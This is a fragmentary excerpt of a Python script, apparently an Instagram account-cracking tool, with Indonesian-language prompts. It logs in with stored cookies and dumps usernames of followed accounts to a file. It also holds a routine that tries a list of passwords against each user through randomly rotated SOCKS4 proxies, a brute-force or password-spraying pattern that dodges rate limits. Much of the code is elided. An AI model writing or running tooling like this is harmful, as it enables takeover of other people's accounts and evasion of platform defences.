    ...
    try:
        ...
        with requests.Session() as ses:
            ...
            if '"status":"ok"' in str(___follow):
                print(f"{H}[{P}!{H}]{P} Login Bu");___menu___()
            else:
                print(f"{P}[{M}!{P}]{M} Cookie Ghalata");sleep(3);os.system('rm -rf Da/coki.txt');___login___()
...
def ___menu___():
    try:
        ...
        print(f"{P}[{M}!{P}]{M} Cookie Invalid");os.system('rm -rf Da/coki.txt && rm -rf Da/user.txt');sleep(3);___login___()
    except (IOError):
        exit(f"{P}[{K}!{P}]{K} Koneksi Error")
    print(f"{B}[{P} 1 {B}]{P} GET USERNAME BY USERNAME")
...
def ___mengikuti___():
    try:
        ...
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            ...
            print(f"{H}[{P} + {H}]{P} NAME INSTAGRAM:{K} {___roz['full_name']}\n")
        ...
        with requests.Session() as ses:
            ...
            print(f"\n{B}[{P}*{B}]{P} Selesai...")
            print(f"{B}[{P} + {B}]{P} NAME FILE:{K} Dump/{___file}")
            input(f"Enter");___menu___()
    except (KeyError):
    ...
    def __main__(self, user, uid, pwx):
        ...
        try:
            for pw in pwx:
                ...
                ___proxy = {'http': 'socks4://%s'%(random.choice(open("Da/proxy.txt","r").read().splitlines()))}
